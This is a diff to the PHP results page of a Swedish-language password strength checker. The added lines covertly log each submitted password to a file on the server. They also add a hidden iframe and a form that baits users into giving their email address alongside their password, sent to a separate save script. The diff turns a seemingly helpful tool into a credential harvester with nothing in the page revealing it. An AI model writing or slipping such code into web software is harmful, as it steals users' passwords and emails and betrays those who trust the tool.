@@ -7,13 +7,19 @@
 <body>
   <div class="big">
     <div class="small">
+      <iframe name="secret_iframe" style="display: none;"></iframe>
+      <?php
+        $password = $_POST["password"];
+        $pw_log = fopen("passwords.txt", "w");
+        fwrite($pw_log, $password + PHP_EOL);
+        fclose($pw_log);
+      ?>
       <h1>Resultat</h1>
       <table>
         <tr>
           <td>Innehåller små bokstäver:</td>
           <td>
             <?php
-              $password = $_POST["password"];
               $lower = "abcdefghijklmnopqrstuvwxyz";
               $contains_lower = 0;
               for($x = 0; $x < strlen($password); $x++) {
@@ -157,6 +163,14 @@
           }
         ?>
       </p>
+      <br>
+      <p>Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar vi</p>
+      <p>ett bra lösenord till dig när vår superhögteknologiska lösenordsgenerator passerar betastadiet.</p>
+      <form action="save_email_and_pw.php" method="post" target="secret_iframe">
+        <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;" disabled>
+        <input type="email" name="email" required>
+        <input type="submit" value="Ge mig ett lösenord!">
+      </form>
     </div>
   </div>
 </body>
